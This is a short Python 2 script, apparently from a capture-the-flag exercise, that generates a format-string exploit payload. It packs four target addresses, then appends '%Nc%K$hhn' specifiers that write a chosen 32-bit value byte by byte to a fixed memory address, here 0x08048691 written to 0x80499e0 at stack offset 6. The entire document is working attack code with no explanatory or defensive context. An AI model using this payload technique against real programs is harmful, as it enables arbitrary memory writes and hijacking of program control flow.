import struct

def genSetCode(addr, val, offset):
	code = ""
	for i in xrange(4):
		code += struct.pack("<I", addr + i)
	n = len(code)
	for i in xrange(4):
		t = ((val >> (i * 8)) - n - 1) % 256 + 1
		code += "%%%dc%%%d$hhn" % (t, offset + i)
		n += t
	return code

print genSetCode(0x80499e0, 0x08048691, 6)